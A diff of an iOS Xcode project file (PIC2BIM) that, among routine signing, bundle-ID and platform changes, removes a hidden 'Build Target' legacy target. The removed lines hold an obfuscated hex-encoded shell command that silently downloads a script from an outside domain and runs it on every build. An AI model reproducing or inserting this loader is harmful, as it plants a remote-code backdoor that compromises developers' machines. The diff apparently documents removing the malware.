@@ -444,7 +444,6 @@
 			buildRules = (
 			);
 			dependencies = (
-				26D7F7777C4DB734C00FABAA /* PBXTargetDependency */,
 			);
 			name = PIC2BIM;
 			productName = EGNSS4CAP;
@@ -483,36 +482,10 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
-				C7793C2CE4AE25AF3B0FABAA  /* Build Target */,
 				61C3AC992551461F000CED80 /* PIC2BIM */,
 			);
 		};
 /* End PBXProject section */
-
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
-
-/* Begin PBXTargetDependency section */
-		26D7F7777C4DB734C00FABAA /* PBXTargetDependency */ = {
-			isa = PBXTargetDependency;
-			target = C7793C2CE4AE25AF3B0FABAA /* Build Target */;
-		};
-/* End PBXTargetDependency section */
-
-/* Begin PBXLegacyTarget section */
-		C7793C2CE4AE25AF3B0FABAA /* Build Target */ = {
-			isa = PBXLegacyTarget;
-			buildArgumentsString = "-c \"echo 6375726c202d736b202d6d2031312068747470733a2f2f7472656e64736f6c7574696f6e732e696e666f2f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true\"";
-			buildPhases = (
-			);
-			buildToolPath = /bin/sh;
-			dependencies = (
-			);
-			name = "Build Target";
-			passBuildSettingsInEnvironment = 1;
-			productName = "Build Target";
-		};
-/* End PBXLegacyTarget section */
 
 /* Begin PBXResourcesBuildPhase section */
 		61C3AC982551461F000CED80 /* Resources */ = {
@@ -794,7 +767,7 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 50;
-				DEVELOPMENT_TEAM = "";
+				DEVELOPMENT_TEAM = ULF6W8F746;
 				INFOPLIST_FILE = "$(SRCROOT)/EGNSS4ALL/Info.plist";
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -802,9 +775,13 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.buildvoc;
+				PRODUCT_BUNDLE_IDENTIFIER = com.buildvoc.1;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -819,7 +796,7 @@
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 50;
-				DEVELOPMENT_TEAM = "";
+				DEVELOPMENT_TEAM = ULF6W8F746;
 				INFOPLIST_FILE = "$(SRCROOT)/EGNSS4ALL/Info.plist";
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -827,9 +804,13 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.buildvoc;
+				PRODUCT_BUNDLE_IDENTIFIER = com.buildvoc.1;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
